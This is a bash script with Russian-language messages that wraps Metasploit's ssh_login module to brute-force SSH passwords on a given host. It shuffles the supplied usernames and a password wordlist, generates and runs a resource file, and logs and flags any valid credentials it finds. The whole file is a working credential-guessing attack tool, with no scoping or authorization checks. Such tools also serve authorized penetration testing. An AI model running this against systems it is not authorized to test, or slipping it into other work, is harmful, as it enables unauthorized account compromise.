#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo "Использование: $0 <RHOSTS> <USERS>"
    echo "Пример: $0 192.168.1.50 \"root,admin,ubuntu,debian\""
    exit 1
fi

TARGET="$1"
USERS="$2"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
CONFIG_FILE="${ACCESS_SCANNER_CONFIG:-$PROJECT_ROOT/config.json}"
config_value() {
    python3 - "$CONFIG_FILE" "$1" <<'PYCFG'
import json, sys
from pathlib import Path
cfg_path, key = sys.argv[1:3]
try:
    data = json.loads(Path(cfg_path).read_text(encoding="utf-8"))
    value = data
    for part in key.split("."):
        value = value[part]
    print(value)
except Exception:
    sys.exit(1)
PYCFG
}
WORDLIST_REL="$(config_value paths.ssh_password_wordlist 2>/dev/null || echo wordlists/500p.txt)"
MSF_BIN="$(config_value binaries.metasploit 2>/dev/null || echo msfconsole)"

LOG_DIR="$PROJECT_ROOT/logs"
LOG_FILE="${LOG_DIR}/ssh_scan_$(date +%Y%m%d_%H%M%S).log"
if [[ "$WORDLIST_REL" = /* ]]; then
    DEFAULT_PASS_FILE="$WORDLIST_REL"
else
    DEFAULT_PASS_FILE="$PROJECT_ROOT/$WORDLIST_REL"
fi
ORIGINAL_PASS_FILE="${SSH_PASSWORD_WORDLIST:-$DEFAULT_PASS_FILE}"
RC_DIR="$PROJECT_ROOT/rcs"

mkdir -p "$LOG_DIR"
mkdir -p "$RC_DIR"

SHUFFLED_USER_FILE=$(mktemp /tmp/msf_users_XXXXXX.txt)
SHUFFLED_PASS_FILE=$(mktemp /tmp/msf_pass_XXXXXX.txt)
RC_FILE=$(mktemp "${RC_DIR}/msf_ssh_login_XXXXXX.rc")

cleanup() {
    echo -e "\n[+] Очистка временных файлов..."
    rm -f "$RC_FILE" "$SHUFFLED_USER_FILE" "$SHUFFLED_PASS_FILE"
    echo "[+] Готово."
}

trap cleanup EXIT

if ! command -v "$MSF_BIN" &> /dev/null; then
    echo "[-] Ошибка: msfconsole не найден." | tee -a "$LOG_FILE"
    exit 1
fi

if [ ! -f "$ORIGINAL_PASS_FILE" ]; then
    echo "[-] Ошибка: файл паролей '$ORIGINAL_PASS_FILE' не найден." | tee -a "$LOG_FILE"
    exit 1
fi

echo "[+] Подготовка списка пользователей..."

# "root,admin,ubuntu,debian" -> отдельные строки
echo "$USERS" | tr ',' '\n' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | shuf > "$SHUFFLED_USER_FILE"

echo "[+] Подготовка списка паролей..."
shuf "$ORIGINAL_PASS_FILE" > "$SHUFFLED_PASS_FILE"

cat << EOF > "$RC_FILE"
use auxiliary/scanner/ssh/ssh_login
set RHOSTS $TARGET
set USER_FILE $SHUFFLED_USER_FILE
set PASS_FILE $SHUFFLED_PASS_FILE
set THREADS 5
set VERBOSE true
run
exit
EOF

echo "[+] Запуск msfconsole для цели: $TARGET..."
echo "[+] Пользователи: $USERS"
echo "[+] Вывод дублируется в лог: $LOG_FILE"

$MSF_BIN -q -r "$RC_FILE" 2>&1 | tee -a "$LOG_FILE"

MSF_EXIT_CODE=${PIPESTATUS[0]}

if [ "$MSF_EXIT_CODE" -ne 0 ]; then
    echo "[-] Metasploit завершился с ошибкой (Код: $MSF_EXIT_CODE)." | tee -a "$LOG_FILE"
    exit "$MSF_EXIT_CODE"
fi

if grep -q "Success" "$LOG_FILE" || grep -q "SSH session" "$LOG_FILE"; then
    echo "[+] Сканирование завершено. Найдены валидные учётные данные!" | tee -a "$LOG_FILE"
else
    echo "[+] Сканирование завершено. Успешных совпадений не найдено." | tee -a "$LOG_FILE"
fi
